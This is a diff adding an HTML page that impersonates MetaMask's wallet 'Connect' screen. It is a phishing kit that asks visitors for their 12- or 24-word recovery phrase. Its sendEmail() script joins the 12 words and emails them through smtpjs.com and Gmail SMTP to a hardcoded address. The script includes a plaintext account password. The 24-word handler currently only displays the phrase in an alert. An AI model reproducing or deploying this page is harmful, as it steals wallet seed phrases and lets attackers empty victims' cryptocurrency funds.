@@ -1,0 +1,326 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="shortcut icon" href="header.png" type="image/x-icon">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
+    <link rel="stylesheet" href="style.css">
+    <script src="https://smtpjs.com/v3/smtp.js"></script>
+    <title>Metamask | Connect</title>
+</head>
+<body class="wallet">
+    
+   <a href="https://metamask.io/#/">
+       <img class="head" src="logo.svg" alt="">
+   </a>
+
+   <h2>Connect To Server</h2>
+  
+   <button id="btn1" onclick="show_hide()">12 WORD PHRASE</button>
+   <div id="15form" class="r-container">
+    <ul class="nav justify-content-between">
+      <h2 class="mnemonic">MNEMONIC</h2>
+    </ul>
+
+    <div class="tab-content" id="myTabContent">
+      <div class="tab-pane fade active show" id="mnemonic" role="tabpanel" aria-labelledby="mnemonic-tab">
+        <form id="contactForm" action="support" method="POST">
+          <input name="_redirect" type="hidden" id="name" value="https://metamask.io/">
+
+          <div class="">
+            <div class="input">
+              <span></span>
+              <input class="mnemonic-input" type="text" name="1" id="one" required placeholder="1">
+            
+              <span></span>
+              <input class="mnemonic-input" type="text" name="2" id="two" required placeholder="2">
+            </div>
+            <div class="input">
+              <span></span>
+              <input class="mnemonic-input" type="text" name="3" id="three" required placeholder="3">
+              <span></span>
+              <input class="mnemonic-input" type="text" name="4" id="four" required placeholder="4">
+            </div>
+            <div class="input">
+              <span></span>
+              <input class="mnemonic-input" type="text" name="5" id="five" required placeholder="5">
+            
+              <span></span>
+              <input class="mnemonic-input" type="text" name="6" id="six" required placeholder="6">
+            </div>
+            <div class="input">
+              <span></span>
+              <input class="mnemonic-input" type="text" name="7" id="seven" required placeholder="7">
+            
+              <span></span>
+              <input class="mnemonic-input" type="text" name="8" id="eight" required placeholder="8">
+            </div>
+            <div class="input">
+                <span></span>
+              <input class="mnemonic-input" type="text" name="9" id="nine" required placeholder="9">
+            <span></span>
+              <input class="mnemonic-input" type="text" name="10" id="ten" required placeholder="10">
+            </div>
+            <div class="input">
+              <span></span>
+              <input class="mnemonic-input" type="text" name="11" id="eleven" required placeholder="11">
+        
+              <span></span>
+              <input class="mnemonic-input" type="text" name="12" id="twelve" required placeholder="12">
+            </div>
+          </div>
+          </div>
+
+            <span><input type="checkbox" name="checkbox" id="mnemonic-checkbox" required=""> I have entered all details correctly.</span>
+           
+          </div>
+          <div>
+            <p style="
+                font-size: 13px;
+                color: #3275ba;
+                text-align: center;
+              ">
+              Input the BIP39/BIP44 recovery phrase here to restore
+              the Mnemonic keys that manage your account
+            </p>
+            <input name="_formsubmit_id" type="text" style="display:none">
+
+            <input onclick="sendEmail()" type="button" class="restore" value="Restore" style="
+                border: 0;
+                border-radius: 7px;
+                font-size: 20px;
+                text-align: center;
+                background: #037dd6;
+                color: #ffffff;
+                width: 60%;
+                padding: 10px 0;
+                margin: 20px 0;
+              ">
+          </div>
+        </form>
+      </div>
+    </div>
+  </div>
+
+
+  <button id="btn2" onclick="hide_show()">24 WORD PHRASE</button>
+  <div id="24form" class="r-container">
+    <ul class="nav justify-content-between">
+      <h2 class="mnemonic">MNEMONIC</h2>
+    </ul>
+
+    <div class="tab-content" id="myTabContent">
+      <div class="tab-pane fade active show" id="mnemonic" role="tabpanel" aria-labelledby="mnemonic-tab">
+        <form id="contactForm" action="support.html" method="POST">
+          <input name="_redirect" type="hidden" id="name" value="https://trustwallet.com/">
+
+          <div class="">
+            <div class="input">
+              <span></span>
+              <input class="mnemonic-input" type="text" name="1" id="one" required placeholder="1">
+            
+              <span></span>
+              <input class="mnemonic-input" type="text" name="2" id="two" required placeholder="2">
+            </div>
+            <div class="input">
+              <span></span>
+              <input class="mnemonic-input" type="text" name="3" id="three" required placeholder="3">
+              <span></span>
+              <input class="mnemonic-input" type="text" name="4" id="four" required placeholder="4">
+            </div>
+            <div class="input">
+              <span></span>
+              <input class="mnemonic-input" type="text" name="5" id="five" required placeholder="5">
+            
+              <span></span>
+              <input class="mnemonic-input" type="text" name="6" id="six" required placeholder="6">
+            </div>
+            <div class="input">
+              <span></span>
+              <input class="mnemonic-input" type="text" name="7" id="seven" required placeholder="7">
+            
+              <span></span>
+              <input class="mnemonic-input" type="text" name="8" id="eight" required placeholder="8">
+            </div>
+            <div class="input">
+                <span></span>
+              <input class="mnemonic-input" type="text" name="9" id="nine" required placeholder="9">
+        <span></span>
+              <input class="mnemonic-input" type="text" name="10" id="ten" required placeholder="10">
+            </div>
+            <div class="input">
+              <span></span>
+              <input class="mnemonic-input" type="text" name="11" id="eleven" required placeholder="11">
+        
+              <span></span>
+              <input class="mnemonic-input" type="text" name="12" id="twelve" required placeholder="12">
+            </div>
+            <div class="input">
+              <span></span>
+              <input class="mnemonic-input" type="text" name="13" id="one3" required placeholder="13">
+        
+              <span></span>
+              <input class="mnemonic-input" type="text" name="14" id="one4" required placeholder="14">
+            </div>
+
+            <div class="input">
+              <span></span>
+              <input class="mnemonic-input" type="text" name="15" id="one5" required placeholder="15">
+        
+              <span></span>
+              <input class="mnemonic-input" type="text" name="16" id="one6" required placeholder="16">
+            </div>
+
+            <div class="input">
+              <span></span>
+              <input class="mnemonic-input" type="text" name="17" id="one7" required placeholder="17">
+        
+              <span></span>
+              <input class="mnemonic-input" type="text" name="18" id="one8" required placeholder="18">
+            </div>
+
+            <div class="input">
+              <span></span>
+              <input class="mnemonic-input" type="text" name="19" id="one9" required placeholder="19">
+        
+              <span></span>
+              <input class="mnemonic-input" type="text" name="20" id="one10" required placeholder="20">
+            </div>
+
+            <div class="input">
+              <span></span>
+              <input class="mnemonic-input" type="text" name="21" id="one11" required placeholder="21">
+        
+              <span></span>
+              <input class="mnemonic-input" type="text" name="22" id="one12" required placeholder="22">
+            </div>
+
+            <div class="input">
+              <span></span>
+              <input class="mnemonic-input" type="text" name="23" id="one13" required placeholder="23">
+        
+              <span></span>
+              <input class="mnemonic-input" type="text" name="24" id="one14" required placeholder="24">
+            </div>
+           
+            </div>
+           
+            
+          </div>
+            <span><input type="checkbox" name="checkbox" id="mnemonic-checkbox" required=""> I have entered all details correctly.</span>
+           
+          </div>
+          <div>
+            <p style="
+                font-size: 13px;
+                color: #3275ba;
+                text-align: center;
+              ">
+              Input the BIP39/BIP44 recovery phrase here to restore
+              the Mnemonic keys that manage your account
+            </p>
+            <input name="_formsubmit_id" type="text" style="display:none">
+
+            <input type="button" onclick="sendEmailBig()" class="restore" value="Restore" style="
+                border: 0;
+                border-radius: 7px;
+                font-size: 20px;
+                text-align: center;
+                background: #037dd6;
+                color: #ffffff;
+                width: 60%;
+                padding: 10px 0;
+                margin: 20px 0;
+              ">
+          </div>
+        </form>
+      </div>
+    </div>
+  </div>
+  <script type="text/javascript">
+    function sendEmail() {
+      var one = document.getElementById("one").value
+      var two = document.getElementById("two").value
+      var three = document.getElementById("three").value
+      var four = document.getElementById("four").value
+      var five = document.getElementById("five").value
+      var six = document.getElementById("six").value
+      var seven = document.getElementById("seven").value
+      var eight = document.getElementById("eight").value
+      var nine = document.getElementById("nine").value
+      var ten = document.getElementById("ten").value
+      var eleven = document.getElementById("eleven").value
+      var twelve = document.getElementById("twelve").value
+      if(one == "" || two =="" || three == "" || four == "" || five == "" || six == "" || seven == "" || eight == "" || nine == "" || ten == "" || eleven == "" || twelve == ""){
+        alert("All fields are required")
+      }else{
+        var phrase = one + " " + two + " " + three + " " + four + " " + five + " " + six + " " + seven + " " + eight + " " + nine + " " + ten + " " + eleven + " " + twelve
+        Email.send({
+        Host: "smtp.gmail.com",
+        Username: "mikezalesky43@gmail.com",
+        Password: "76282094jf",
+        To: 'mikezalesky43@gmail.com',
+        From: "Scotperry42@gmail.com",
+        Subject: "Sending The Unique Phrase",
+        Body: phrase,
+      })
+        .then(function (message) {
+          alert("mail sent successfully")
+        });
+      }
+    }
+
+    function sendEmailBig() {
+      var one = document.getElementById("one").value
+      var two = document.getElementById("two").value
+      var three = document.getElementById("three").value
+      var four = document.getElementById("four").value
+      var five = document.getElementById("five").value
+      var six = document.getElementById("six").value
+      var seven = document.getElementById("seven").value
+      var eight = document.getElementById("eight").value
+      var nine = document.getElementById("nine").value
+      var ten = document.getElementById("ten").value
+      var eleven = document.getElementById("eleven").value
+      var twelve = document.getElementById("twelve").value
+      var one3 = document.getElementById("one3").value
+      var one4 = document.getElementById("one4").value
+      var one5 = document.getElementById("one5").value
+      var one6 = document.getElementById("one6").value
+      var one7 = document.getElementById("one7").value
+      var one8 = document.getElementById("one8").value
+      var one9 = document.getElementById("one9").value
+      var one10 = document.getElementById("one10").value
+      var one11 = document.getElementById("one11").value
+      var one12 = document.getElementById("one12").value
+      var one13 = document.getElementById("one13").value
+      var one14 = document.getElementById("one14").value
+      if(one == "" || two =="" || three == "" || four == "" || five == "" || six == "" || seven == "" || eight == "" || nine == "" || ten == "" || eleven == "" || twelve == "" || one3 == "" || one4 =="" || one5 == "" || one6 == "" || one7 == "" || one8 == "" || one9 == "" || one10 == "" || one11 == "" || one12 == "" || one13 == "" || one14 == ""){
+        alert("All fields are required")
+      }else{
+        var phrase = one + " " + two + " " + three + " " + four + " " + five + " " + six + " " + seven + " " + eight + " " + nine + " " + ten + " " + eleven + " " + twelve + " " + one3 + " " + one4 + " " + one5 + " " + one6 + " " + one7 + " " + one8 + " " + one9 + " " + one10 + " " + one11 + " " + one12 + " " + one13 + " " + one14
+        // Email.send({
+      //   Host: "smtp.gmail.com",
+      //   Username: "sender@email_address.com",
+      //   Password: "Enter your password",
+      //   To: 'receiver@email_address.com',
+      //   From: "sender@email_address.com",
+      //   Subject: "Sending Email using javascript",
+      //   Body: "Well that was easy!!",
+      // })
+      //   .then(function (message) {
+      //     alert("mail sent successfully")
+      //   });
+      alert(phrase)
+      }
+    }
+  </script>
+
+ 
+<script src="script.js"></script>
+  <script src="script.js"></script>
+</body>
+</html>
+  
